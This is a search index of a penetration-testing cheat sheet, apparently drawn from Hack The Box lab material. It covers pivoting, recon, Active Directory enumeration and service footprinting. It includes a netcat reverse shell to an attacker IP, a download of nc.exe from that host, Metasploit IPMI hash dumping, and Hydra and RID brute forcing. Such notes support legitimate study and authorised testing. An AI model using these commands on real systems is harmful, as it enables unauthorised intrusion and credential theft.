{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"HACKING AWESOME CHEATSHEET","text":""},{"location":"pivoting/","title":"Pivoting","text":""},{"location":"pivoting/#chisel","title":"CHISEL","text":"<ol> <li>Install on attack box: <code>curl https://i.jpillora.com/chisel! | bash</code></li> <li>Edit /etc/proxychains.conf &gt; socks5 127.0.0.1 1080</li> <li>Run server: <code>chisel server -p 8001 \u2014reverse</code></li> <li>Run client:  <code>.\\chisel.exe client 10.10.14.179:8001 R:1080:socks</code></li> <li>Run command: <code>proxychains4 -q nmap ip-address</code></li> <li>Links:<ol> <li>https://github.com/jpillora/chisel</li> <li>https://ap3x.github.io/posts/pivoting-with-chisel/</li> </ol> </li> </ol>"},{"location":"pivoting/#netcat","title":"NETCAT","text":"<ol> <li>Download on windows host: <code>Invoke-WebRequest -Uri [http://10.10.14.144:9999/nc.exe](http://10.10.14.144:9999/nc.exe) -OutFile nc.exe -UseBasicParsing</code></li> <li>Run nc on atack host: <code>nc -nlvp 4444</code></li> <li>Run nc on target: <code>nc.exe 10.10.14.144 4444 -e cmd.exe</code></li> </ol>"},{"location":"pivoting/#netshexe","title":"NETSH.EXE","text":"<ol> <li>Using Netsh.exe to Port Forward <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</code></li> <li>Verifying Port Forward <code>netsh.exe interface portproxy show v4tov4</code></li> <li>Connecting to the Internal Host through the Port Forward <code>xfreerdp /v:ip-address:port /u:user /p:password</code></li> </ol>"},{"location":"webinfogathering/","title":"Web Information Gathering","text":""},{"location":"webinfogathering/#whois","title":"Whois","text":"<p><code>whois inlanefreight.com</code></p>"},{"location":"webinfogathering/#dig","title":"Dig","text":"<pre><code>dig domain.com` #Performs a default A record lookup for the domain.\ndig domain.com A #Retrieves the IPv4 address (A record) associated with the domain.\ndig domain.com AAAA #Retrieves the IPv6 address (AAAA record) associated with the domain.\ndig domain.com MX #Finds the mail servers (MX records) responsible for the domain.\ndig domain.com NS #Identifies the authoritative name servers for the domain.\ndig domain.com TXT #Retrieves any TXT records associated with the domain.\ndig domain.com CNAME #Retrieves the canonical name (CNAME) record for the domain.\ndig domain.com SOA #Retrieves the start of authority (SOA) record for the domain.\ndig @1.1.1.1 domain.com #Specifies a specific name server to query; in this case 1.1.1.1\ndig +trace domain.com #Shows the full path of DNS resolution. |\ndig -x 192.168.1.1 #Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.\ndig +short domain.com #Provides a short, concise answer to the query.\ndig +noall +answer domain.com #Displays only the answer section of the query output.\ndig domain.com ANY #Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).\n</code></pre>"},{"location":"webinfogathering/#subdomain-enumeration","title":"Subdomain enumeration","text":""},{"location":"webinfogathering/#dnsenum","title":"Dnsenum","text":"<p><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r</code></p>"},{"location":"webinfogathering/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<p><code>dig axfr @nsztm1.digi.ninja zonetransfer.me</code></p>"},{"location":"webinfogathering/#virtual-hosts","title":"Virtual hosts","text":"<p><code>gobuster vhost -u http://&lt;target_IP_address&gt; -w &lt;wordlist_file&gt; --append-domain</code></p>"},{"location":"webinfogathering/#crtsh","title":"crt.sh","text":"<p><code>curl -s \"[https://crt.sh/?q=facebook.com&amp;output=json](https://crt.sh/?q=facebook.com&amp;output=json)\" | jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value' | sort -u</code></p>"},{"location":"webinfogathering/#banner-grabbing","title":"Banner grabbing","text":"<p><code>curl -I inlanefreight.com</code></p>"},{"location":"webinfogathering/#waf-detection","title":"WAF detection","text":""},{"location":"webinfogathering/#wafw00f","title":"wafw00f","text":"<ol> <li><code>pip3 install git+https://github.com/EnableSecurity/wafw00f</code></li> <li><code>wafw00f inlanefreight.com</code></li> </ol>"},{"location":"webinfogathering/#crawling","title":"Crawling","text":""},{"location":"webinfogathering/#reconspider","title":"ReconSpider","text":"<ol> <li><code>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip</code></li> <li><code>unzip ReconSpider.zip</code></li> <li><code>python3 ReconSpider.py http://inlanefreight.com</code> </li> </ol>"},{"location":"active-directory/adenumeration/","title":"AD Enumeration","text":""},{"location":"active-directory/adenumeration/#powershell","title":"Powershell","text":"<ol> <li>Find the member of the some group on given host: <code>Get-LocalGroupMember -Group \"GROUP NAME\"</code></li> <li>Look at the ACL for a single domain user: <code>(Get-ACL \"AD:$((Get-ADUser USER.NAME).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"INLANEFREIGHT\\cliff.moore\"}</code></li> <li>Drill down further on this user to find all users with WriteProperty or GenericAll rights over the target user: <code>(Get-ACL \"AD:$((Get-ADUser daniel.carter).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W</code></li> <li>Get GPO using GUID: <code>Get-GPO -Guid 831DE3ED-40B1-4703-ABA7-8EA13B2EB118</code></li> </ol>"},{"location":"active-directory/adenumeration/#cmd","title":"CMD","text":"<ol> <li>Built-in tool that determines GPOs that have been applied to a given user or computer and their settings:<ol> <li><code>gpresult /r /user:harry.jones</code></li> <li><code>gpresult /r /S WS01</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#powerview-sharpview-useful-command","title":"PowerView/ SharpView useful command","text":"<ol> <li>Convert a username to the corresponding SID <code>.\\SharpView.exe ConvertTo-SID -Name sally.jones</code></li> <li>Convert SID to a username: <code>.\\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724</code></li> <li>Get Domain Info: <code>.\\SharpView.exe Get-Domain</code></li> <li>Get all OUs: <code>.\\SharpView.exe Get-DomainOU | findstr /b \"name\"</code></li> <li>Get users with PreauthNotRequired: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired</code></li> <li>Gathering information about individual hosts: <code>Get-DomainComputer | select dnshostname, useraccountcontrol</code></li> <li>Return all Group Policy Objects (GPOs) names: <code>.\\SharpView.exe Get-DomainGPO | findstr displayname</code></li> <li>Determine which GPOs map back to which hosts: <code>Get-DomainGPO -ComputerIdentity WS01 | select displayname</code></li> <li>Check if our current user has local admin rights on any remote hosts: <code>Test-AdminAccess -ComputerName SQL01</code></li> <li>Eenumerate open shares on a remote computer: <code>.\\SharpView.exe Get-NetShare -ComputerName DC01</code></li> <li>Find domain machines that users are logged into: <code>Find-DomainUserLocation</code></li> <li>All domain trusts for our current domain: <code>Get-DomainTrust</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-users","title":"Enumerating AD users","text":"<ol> <li>Users number: <code>(Get-DomainUser).count</code></li> <li>Get user with properties: <code>Get-DomainUser -Identity USER-NAME -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol</code></li> <li>Enumerate these properties for ALL domain users and export them to a CSV file: <code>Get-DomainUser * -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\\inlanefreight_users.csv -NoTypeInformation</code></li> <li>Obtaining a list of users that do not require Kerberos pre-authentication and can be subjected to an ASREPRoast attack: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Gather information about users with Kerberos constrained delegation: <code>.\\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Users that allow unconstrained delegation: <code>.\\SharpView.exe Get-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\"</code></li> <li>Any domain users with sensitive data such as a password stored in the description field: <code>Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}</code></li> <li>Enumerate any users with Service Principal Names (SPNs) that could be subjected to a Kerberoasting attack: <code>.\\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname</code></li> <li>Enumerate any users from other (foreign) domains with group membership within any groups in our current domain: <code>Find-ForeignGroup</code></li> <li>Checking for users with Service Principal Names (SPNs) set in other domains that we can authenticate into via inbound or bi-directional trust relationships with forest-wide authentication allowing all users to authenticate across a trust or selective-authentication set up which allows specific users to authenticate: <code>Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl</code></li> <li>Display all password set times: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset</code></li> <li>If you want only to show passwords set before a certain date: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-groups","title":"Enumerating AD Groups","text":"<ol> <li>Get Domain's Groups: <code>Get-DomainGroup -Properties Name</code></li> <li>Use Get-DomainGroupMember to examine group membership in any given group: <code>.\\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'</code></li> <li>Look for all AD groups with the AdminCount attribute set to 1, signifying that this is a protected group: <code>.\\SharpView.exe Get-DomainGroup -AdminCount</code></li> <li>Look for any managed security groups: <code>Find-ManagedSecurityGroups | select GroupName</code></li> <li>Look at the Security Operations group and see if the group has a manager set: <code>Get-DomainManagedSecurityGroup</code></li> <li>Enumerating the ACLs set on this group: <ol> <li><code>$sid = ConvertTo-SID user-name</code></li> <li><code>Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}</code></li> </ol> </li> <li>Check local group membership: <code>Get-NetLocalGroup -ComputerName WS01 | select GroupName</code></li> <li>Enumerate the local group members on any given host: <code>.\\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01</code></li> <li>Same function to check all the hosts that a given user has local admin access:<ol> <li><code>$sid = Convert-NameToSid USER-NAME</code></li> <li><code>$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname</code></li> <li><code>foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-computers","title":"Enumerating AD Computers","text":"<ol> <li>Get hostname, operating system, and User Account Control (UAC) attributes and save to file: <code>.\\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\\inlanefreight_computers.csv -NoTypeInformation</code></li> <li>Find to any computers in the domain are configured to allow unconstrained delegation and find one, the domain controller, which is standard: <code>.\\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol</code></li> <li>Check for any hosts set up to allow for constrained delegation: <code>Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-domain-acls","title":"Enumerating Domain ACLs","text":"<ol> <li>Look at the ACL for a single domain user: <code>Get-DomainObjectAcl -Identity USER.NAME -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Seek out ACLs on specific users and filter out results using the various AD filters: <code>Find-InterestingDomainAcl -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Look at the ACLs set on file shares: <ol> <li><code>Get-NetShare -ComputerName SQL01</code></li> <li><code>Get-PathAcl \"\\\\SQL01\\DB_backups\"</code></li> </ol> </li> <li>Use the Get-ObjectACL function to search for all users that have these rights: <code>Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object SecurityIdentifier | Sort-Object -Property SecurityIdentifier -Unique</code></li> <li>Convert the SID back to the user: <code>convertfrom-sid S-1-5-21-2974783224-3764228556-2640795941-1883</code></li> <li>Point 5 and 6 can be done:<ol> <li><code>$dcsync = Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value</code></li> <li><code>Convert-SidToName $dcsync</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-group-policy-objects-gpos","title":"Enumerating Group Policy Objects (GPOs)","text":"<ol> <li>Gathering GPO names: <code>Get-DomainGPO | select displayname</code></li> <li>Check which GPOs apply to a specific computer: <code>Get-DomainGPO -ComputerName WS01 | select displayname</code></li> <li>We can use the Get-DomainGPO and Get-ObjectAcl using the SID for the Domain Users group to see if this group has any permissions assigned to any GPOs: <code>Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}</code></li> </ol>"},{"location":"active-directory/adenumeration/#links","title":"Links","text":"<ol> <li>https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</li> <li>SharpGPOAbuse is an excellent tool that can be used to take advantage of GPO misconfigurations.</li> </ol>"},{"location":"enumeration/enumeration/","title":"Enumeration","text":""},{"location":"enumeration/enumeration/#host-discovery","title":"Host discovery","text":"<p>Powershell</p> <pre><code>1..254 | % { $ip=\"172.30.0.$_\"; if (ping -n 1 -w 100 $ip | Select-String \"TTL=\") { \"$ip is up\" } }\n</code></pre> <p>Bash</p> <pre><code>for ip in 172.30.0.{1..254}; do ping -c 1 -W 1 $ip &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"$ip is up\"; done\n</code></pre>"},{"location":"enumeration/enumeration/#rustscan","title":"Rustscan","text":"<pre><code>sudo apt install cargo\ncargo install rustscan\nexport PATH=$PATH:/path/to/rustscan\nchmod +x /path/to/rustscan\necho 'export PATH=$PATH:/root/.cargo/bin' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nrustscan --version\nrustscan -a 172.20.0.52 -r 1-1000 //r - port range\nrustscan -a 172.20.0.52 -r 1-1000 -u -- -Pn //no ping\n\n</code></pre>"},{"location":"enumeration/nmap/","title":"Nmap","text":"<ol> <li>Host discovery: <code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5</code></li> <li>Scanning from IP list file: <code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5</code></li> <li>Scan Multiple IPs: <code>sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5</code></li> <li>Scan Single IP: <code>sudo nmap 10.129.2.18 -sn -oA host</code></li> <li>Discovering Open UDP Ports: <code>sudo nmap 10.129.2.28 -F -sU</code></li> <li>Banner Grabbing: <code>sudo nmap 10.129.2.28 -p- -sV</code></li> <li>Specifying Scripts: <code>sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands</code></li> <li>Vuln Category: <code>sudo nmap 10.129.2.28 -p 80 -sV --script vuln</code></li> <li>Optimized RTT: <code>sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</code></li> <li>Decoy: <code>sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</code></li> </ol>"},{"location":"footprinting/dns/","title":"DNS","text":"<ol> <li>DIG<ol> <li>NS Query <code>dig ns inlanefreight.htb @10.129.14.128</code></li> <li>Version Query <code>dig CH TXT version.bind 10.129.120.85</code></li> <li>ANY Query <code>dig any inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer <code>dig axfr inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer - Internal <code>dig axfr internal.inlanefreight.htb @10.129.14.128</code></li> </ol> </li> <li>Subdomain Brute Forcing <code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done</code></li> <li>DNSenum <code>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb</code></li> </ol>"},{"location":"footprinting/domain-info/","title":"Domain info","text":"<ol> <li>Certificate Transparency: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq .</code></li> <li>Filtered by the unique subdomains: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep</code></li> <li>Identify the hosts directly accessible from the Internet and not hosted by third-party providers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Shodan: <ol> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done</code></li> <li><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></li> </ol> </li> <li>Display all the available DNS records where we might find more hosts: <code>dig any inlanefreight.com</code></li> </ol>"},{"location":"footprinting/domain-info/#cloud-resources","title":"Cloud Resources","text":"<ol> <li>Company Hosted Servers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Google Search for AWS: <code>intext:sometexthere inurl:amazonaws.com</code></li> <li>Google Search for Azure: <code>intext:sometexthere inurl:blob.core.windows.net</code></li> </ol>"},{"location":"footprinting/ftp/","title":"FTP","text":"<ol> <li>Anonymous Login: <code>ftp 10.129.14.136</code> </li> <li>Download file: <code>get filename</code></li> <li>Download All Available Files: <code>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136</code></li> <li>Upload a File: <code>put testupload.txt</code></li> <li>Nmap:<ol> <li><code>find / -type f -name ftp* 2&gt;/dev/null | grep scripts</code></li> <li><code>sudo nmap -sV -p21 -sC -A 10.129.14.136</code> <code>\u2014scripts \u2014script-trace</code></li> </ol> </li> </ol>"},{"location":"footprinting/imap-pop3/","title":"IMAP/POP3","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC</code></li> <li>cURL: <code>curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd</code> <code>-v</code></li> <li>OpenSSL - TLS Encrypted Interaction POP3: <code>openssl s_client -connect 10.129.14.128:pop3s</code></li> <li>OpenSSL - TLS Encrypted Interaction IMAP: <code>openssl s_client -connect 10.129.14.128:imaps</code></li> <li>IMAP Commands</li> </ol> <pre><code>1 LOGIN username password #User's login.\n1 LIST \"\" * #Lists all directories.  \n1 CREATE \"INBOX\" #Creates a mailbox with a specified name.                                  \n1 DELETE \"INBOX\" #Deletes a mailbox.      \n1 RENAME \"ToRead\" \"Important\" #Renames a mailbox. \n1 LSUB \"\" * #Returns a subset of names from the set of names that the User has declared as being active or subscribed. |\n1 SELECT INBOX #Selects a mailbox so that messages in the mailbox can be accessed.        \n1 UNSELECT INBOX #Exits the selected mailbox.                             \n1 FETCH &lt;ID&gt; all #Retrieves data associated with a message in the mailbox.                  \n1 CLOSE #Removes all messages with the Deleted flag set.                           \n1 LOGOUT #Closes the connection with the IMAP server.                               \n</code></pre> <ol> <li>POP3 Commands</li> </ol> <pre><code>USER #usernameIdentifies the user.                        \nPASS #passwordAuthentication of the user using its password.            \nSTAT #Requests the number of saved emails from the server.      \nLIST #Requests from the server the number and size of all emails.             |\nRETR id #Requests the server to deliver the requested email by ID. \nDELE id #Requests the server to delete the requested email by ID.   \nCAPA #Requests the server to display the server capabilities.   \nRSET #Requests the server to reset the transmitted information. \nQUIT #Closes the connection with the POP3 server. \n</code></pre>"},{"location":"footprinting/ipmi/","title":"IPMI","text":"<ol> <li>Nmap: <code>sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local</code></li> <li>Metasploit Version Scan: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version</code></li> <li>Metasploit dump hashes: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes</code></li> </ol>"},{"location":"footprinting/ldap/","title":"LDAP","text":"<ol> <li>LDAP Anonymous Bind<ol> <li>Confirmation that anonymous bind can be done with Python:</li> </ol> </li> </ol> <pre><code>from ldap3 import*\ns = Server('10.10.10.161',get_info = ALL)\nc = Connection(s,'','')\nc.bind()\nTrue\n</code></pre> <ol> <li>We can confirm anonymous LDAP bind with <code>ldapsearch</code> and retrieve all AD objects from LDA: <code>ldapsearch -H ldap://10.129.1.207 -x -b \"dc=inlanefreight,dc=local\"</code></li> <li>Windapsearch<ol> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -u \"\" -U</code></li> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -d htb.local --custom \"objectClass=*\"</code></li> </ol> </li> </ol>"},{"location":"footprinting/mongodb/","title":"MongoDB","text":"<ol> <li><code>mongo ip-address:port</code></li> <li><code>show dbs</code></li> <li><code>use db-name</code></li> <li><code>show collections</code></li> <li>Show content of collection: <code>db.flag.find().pretty()</code></li> </ol>"},{"location":"footprinting/mssql/","title":"MSSQL","text":"<ol> <li>Nmap: <code>sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248</code></li> <li>MSSQL Ping in Metasploit: <code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248</code></li> <li>Connecting with Mssqlclient.py<ol> <li>connect <code>python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth</code></li> <li>Interact with: <code>select name from sys.databases</code></li> </ol> </li> </ol>"},{"location":"footprinting/mysql/","title":"MYSQL","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</code></li> <li>Interaction with MySQL:<ol> <li>without pass: <code>mysql -u root -h 10.129.14.132</code></li> <li>with pass: <code>mysql -u root -pP4SSw0rd -h 10.129.14.128</code></li> </ol> </li> <li>Commands:</li> </ol> <pre><code>show databases;\nselect version();\nuse mysql;\nshow tables;\nshow columns from &lt;table&gt;;\nselect * from &lt;table&gt;;\nselect * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";\n</code></pre>"},{"location":"footprinting/nfs/","title":"NFS","text":"<ol> <li>Nmap:<ol> <li><code>sudo nmap 10.129.14.128 -p111,2049 -sV -sC</code></li> <li><code>sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049</code></li> </ol> </li> <li>Show Available NFS Shares: <code>showmount -e 10.129.14.128</code></li> <li>Mounting NFS Share:</li> </ol> <pre><code>mkdir target-NFS\nsudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\ncd target-NFS\ntree .\n</code></pre> <ol> <li>List Contents with Usernames &amp; Group Names: <code>ls -l mnt/nfs/</code></li> <li>List Contents with UIDs &amp; GUIDs: <code>ls -n mnt/nfs/</code></li> <li>Unmounting:<ol> <li><code>cd ..</code></li> <li><code>sudo umount ./target-NFS</code></li> </ol> </li> </ol>"},{"location":"footprinting/rdp/","title":"RDP","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</code></li> <li>rdp-sec-check<ol> <li><code>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check</code></li> <li><code>./rdp-sec-check.pl 10.129.201.24</code> </li> </ol> </li> <li>Initiate an RDP Session<ol> <li><code>xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:10.129.201.248</code></li> <li><code>xfreerdp /u:username /p:password /v:10.129.75.180 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution /drive:linux,/</code></li> </ol> </li> </ol>"},{"location":"footprinting/rservices/","title":"RSERVICES","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 512,513,514 10.0.17.2</code></li> <li>Logging in Using Rlogin: <code>rlogin 10.0.17.2 -l user-name</code></li> </ol>"},{"location":"footprinting/rsync/","title":"RSYNC","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 873 127.0.0.1</code></li> <li>Enumerating an Open Share: <code>rsync -av --list-only rsync://127.0.0.1/dev</code></li> </ol>"},{"location":"footprinting/smb/","title":"SMB","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p139,445</code></li> <li> <p>SMBclient     <code>bash     smbclient -N -L //10.129.14.128 # no logon     smbclient //10.129.14.128/notes # connecting to share</code></p> </li> <li> <p>Download Files: <code>get file_name</code></p> </li> <li>Brute Forcing User RIDs: <ol> <li> <p><code>bash for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done</code></p> </li> <li>You can use script from Impacket called samrdump.py alternatively: <code>samrdump.py 10.129.14.128</code></li> </ol> </li> <li>Crackmapexec: <code>crackmapexec smb 10.129.14.128 --shares -u '' -p ''</code></li> <li>RPCclient:</li> </ol> <pre><code>rpcclient -U \"\" 10.129.14.128\nsrvinfo\nenumdomains\nquerydominfo\nnetshareenumall\nnetsharegetinfo notes\nenumdomusers\nqueryuser 0x3e9\nquerygroup 0x201\n</code></pre> <ol> <li>SMBMap: <code>smbmap -H 10.129.14.128</code></li> <li>Enum4Linux:</li> </ol> <pre><code>git clone https://github.com/cddmp/enum4linux-ng.git\ncd enum4linux-ng\npip3 install -r requirements.txt\n./enum4linux-ng.py 10.129.14.128 -A\n</code></pre> <ol> <li>HYDRA <code>hydra -L user.list -P password.list smb://10.129.42.197</code></li> </ol>"},{"location":"footprinting/smtp/","title":"SMTP","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap 10.129.14.128 -sC -sV -p25</code></li> <li><code>sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v</code></li> </ol> </li> <li>Commands</li> </ol> <pre><code>AUTH PLAIN AUTH #is a service extension used to authenticate the client.                                   |\nHELO #The client logs in with its computer name and thus starts the session.                         |\nMAIL FROM #The client names the email sender.                                                             |\nRCPT TO #The client names the email recipient.                                                          |\nDATA #The client initiates the transmission of the email.                                            |\nRSET #The client aborts the initiated transmission but keeps the connection between client and server.|\nVRFY #The client checks if a mailbox is available for message transfer.                              |\nEXPN #The client also checks if a mailbox is available for messaging with this command.              |\nNOOP #The client requests a response from the server to prevent disconnection due to time-out.       |\nQUIT #The client terminates the session. \n</code></pre>"},{"location":"footprinting/snmp/","title":"SNMP","text":"<ol> <li>SNMPwalk: <code>snmpwalk -v2c -c public 10.129.14.128</code></li> <li>OneSixtyOne: <ol> <li><code>sudo apt install onesixtyone</code></li> <li><code>onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128</code></li> </ol> </li> <li>Braa:<ol> <li><code>sudo apt install braa</code></li> <li><code>braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax</code></li> <li><code>braa public@10.129.14.128:.1.3.6.* # example</code></li> </ol> </li> </ol>"},{"location":"footprinting/ssh/","title":"SSH","text":"<ol> <li>SSH audit<ol> <li><code>git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit</code></li> <li><code>./ssh-audit.py 10.129.14.132</code></li> </ol> </li> </ol>"},{"location":"footprinting/tns/","title":"ORACLE TNS","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open</code></li> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute</code></li> </ol> </li> <li>odat.py <code>./odat.py all -s 10.129.204.235</code></li> <li>SQLplus - for log In: <code>sqlplus scott/tiger@10.129.204.235/XE</code></li> <li>SQLplus commands</li> </ol>"},{"location":"footprinting/winrm/","title":"WinRM","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n</code></li> </ol>"},{"location":"footprinting/wmi/","title":"Wmi","text":"<ol> <li>wmiexec.py <code>usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"</code></li> </ol>"}]}